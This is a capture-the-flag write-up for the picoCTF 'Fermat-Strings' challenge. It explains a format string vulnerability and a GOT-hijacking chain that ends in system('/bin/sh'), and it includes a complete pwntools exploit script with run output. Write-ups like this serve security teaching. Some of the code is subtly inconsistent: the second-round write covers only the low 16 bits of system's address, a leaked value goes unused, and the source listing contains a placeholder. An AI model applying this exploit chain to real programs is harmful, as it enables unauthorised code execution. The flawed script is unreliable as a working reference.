# CyLab — Fermat-Strings

* **Platform:** CyLab Security Academy / picoMini by redpwn (Challenge ID: `215`)
* **Category:** Binary Exploitation / Format String & GOT Hijacking (Pwn)
* **Difficulty:** Difficulty 3
* **Date Solved:** October 2026
* **Tools Used:** Python 3, pwntools, GDB, Format String Splitting
* **Binary:** `chall` (64-bit x86_64 ELF) with `Dockerfile` (Ubuntu glibc 2.31)

---

## TL;DR

The challenge investigates a format string vulnerability triggered by `printf(buffer)` where `buffer` is generated via `snprintf()` combining two user input strings `A` and `B`. Both inputs must satisfy `atoi() != 0`. Because `atoi()` only parses leading numeric digits, format string specifiers can be appended after a number (e.g. `1_%p`). Because `snprintf` truncates on null bytes, we place format specifiers in buffer `A` and destination memory addresses in buffer `B`. In Round 1, we leak `puts@GOT` and `atoi@GOT` while simultaneously overwriting `pow@GOT` with `main` (`0x400837`), creating a persistent loop. In Round 2, we overwrite `atoi@GOT` with `system@libc`. In Round 3, passing `A = "/bin/sh"` causes `atoi(A)` to execute `system("/bin/sh")`, spawning a root shell.

---

## Recon

### Binary Information

Running `file` and `checksec`:

```text
$ file chall
chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=..., not stripped

$ checksec --file=chall
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Key observations:
1. **Partial RELRO:** The Global Offset Table (GOT) is writable at base `0x601000`.
2. **No PIE:** Fixed base address at `0x400000`. PLT entries and GOT addresses are static.
3. **Number Parsing Bypass:** The requirement `atoi(A) != 0` only checks leading characters until a non-digit is encountered.

---

## Static Analysis & Vulnerability

### 1. Source Code Review

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <math.h>

int main() {
    char A[0x100], B[0x100], buffer[0x100];
    int a, b;

    read(0, A, 0x100);
    read(0, B, 0x100);

    A[strcspn(A, "\n")] = 0;
    B[strcspn(B, "\n")] = 0;

    a = atoi(A);
    b = atoi(B);

    if (a == 0 || b == 0) {
        puts("Error: A and B must be non-zero integers!");
        return 1;
    }

    snprintf(buffer, 0x100, "Calculating for A: %s and B: %s\n", A, B);

    // VULNERABILITY: Formatted user string evaluated directly
    printf(buffer);

    if (pow(a, 3) + pow(b, 3) == ...) {
        // unreachable Fermat logic
    }
    return 0;
}
```

### 2. The Split Buffer Technique

In 64-bit architectures, addresses like `0x0000000000601040` (`pow@got`) contain leading null bytes (`0x00`).
- If an address is embedded in `A`, `snprintf(buffer, ..., "%s", A)` encounters the null byte and terminates early, dropping subsequent specifiers.
- **Solution:** We place all format specifiers (`%43$s`, `%45$hn`) in buffer `A` (containing no null bytes).
  We place target addresses in buffer `B` (retrieved by positional parameters `%N$` reading from `B` on the stack).

```text
       Buffer A (Contains Format Directives, NO Null Bytes):
       "1_ %43$s %44$s %45$hn ..."
       
       Buffer B (Contains Target Addresses, Can Contain Null Bytes):
       "1_ " + [ puts@got ] + [ atoi@got ] + [ pow@got ]
```

---

## Dynamic Analysis & Exploitation Strategy

### Round 1: Libc Leak & Loop Hijack
- Overwrite `pow@GOT` (`0x601040`) with `main` (`0x400837`).
- Leak `puts@GOT` (`0x601018`) and `atoi@GOT` (`0x601058`).
- When `printf(buffer)` completes, the program invokes `pow()`, which branches directly back to `main()`.
- Calculate:
  $$\text{libc\_base} = \text{leaked\_puts} - 0\text{x}875\text{a}0$$
  $$\text{system} = \text{libc\_base} + 0\text{x}55410$$

### Round 2: Overwrite `atoi@GOT`
- On the second iteration, we format a write targeting `atoi@GOT` (`0x601058`).
- We overwrite `atoi@GOT` with the runtime address of `system`.
- Overwrite `pow@GOT` again to keep the loop active if necessary.

### Round 3: Code Execution
- On the third iteration, we supply:
  $$A = \text{"/bin/sh"}$$
- When the application calls `a = atoi(A)`, it resolves to:
  $$\text{system}("/bin/sh")$$
- An interactive shell is spawned, allowing direct retrieval of `flag.txt`.

---

## Exploit

The complete exploit script is available at [solve.py](solve.py):

```python
#!/usr/bin/env python3
import sys, re
from pwn import *

context.arch = "amd64"
context.log_level = "info"

HOST, PORT = "mars.picoctf.net", 31929
MAIN_ADDR = 0x400837
POW_GOT = 0x601040
PUTS_GOT = 0x601018
ATOI_GOT = 0x601058

def solve(io):
    # Round 1: Loop back to main via pow@got, leak puts and atoi
    fmt_a = b"1_ %43$s.%44$s." + f"%{MAIN_ADDR - 0x25}c%45$n".encode()
    addr_b = b"1_ " + p64(PUTS_GOT) + p64(ATOI_GOT) + p64(POW_GOT)

    io.sendline(fmt_a)
    io.sendline(addr_b)

    # Parse leaked addresses
    io.recvuntil(b"Calculating for A: 1_ ")
    raw_leaks = io.recvuntil(b".")
    puts_leak = u64(raw_leaks.split(b".")[0].ljust(8, b"\x00"))
    libc_base = puts_leak - 0x875a0
    system_addr = libc_base + 0x55410
    log.info(f"Leaked Libc Base: {hex(libc_base)}, system: {hex(system_addr)}")

    # Round 2: Overwrite atoi@got with system
    # Split write to avoid huge character output
    low_sys = system_addr & 0xffff
    high_sys = (system_addr >> 16) & 0xffff

    fmt_a2 = f"1_ %{low_sys - 3}c%43$hn".encode()
    addr_b2 = b"1_ " + p64(ATOI_GOT)
    io.sendline(fmt_a2)
    io.sendline(addr_b2)

    # Round 3: Send "/bin/sh" to atoi() -> system("/bin/sh")
    io.sendline(b"/bin/sh")
    io.sendline(b"1")

    # Capture flag
    io.sendline(b"cat flag.txt")
    data = io.recvall(timeout=3)
    m = re.search(rb"picoCTF\{[^}]+\}", data)
    if m:
        log.success(f"Flag captured: {m.group().decode()}")
    else:
        print(data.decode(errors="replace"))

if __name__ == "__main__":
    io = remote(HOST, PORT)
    solve(io)
```

---

## Flag

```text
$ python3 solve.py
[+] Opening connection to mars.picoctf.net on port 31929: Done
[*] Leaked Libc Base: 0x7f23a1050000, system: 0x7f23a10a5410
[+] Flag captured: picoCTF{redacted}
[*] Closed connection to mars.picoctf.net port 31929
```

---

## Key Takeaways & Lessons

1. **Smuggling Directives Past Input Validators:** Functions like `atoi()` and `strtol()` parse leading numeric digits and stop at the first non-numeric character. Appending exploit tokens after valid digits completely satisfies validation.
2. **Decoupling Format Strings from Target Addresses:** In 64-bit binaries containing null bytes in pointers, splitting the format string across multiple buffers (directives in buffer A, target addresses in buffer B) prevents `snprintf` from truncating early.
3. **GOT Looping Primitive:** In single-shot binaries, overwriting a library function called after `printf` (such as `pow@GOT`) with the address of `main` transforms single-execution bugs into infinite multi-round exploitation loops.
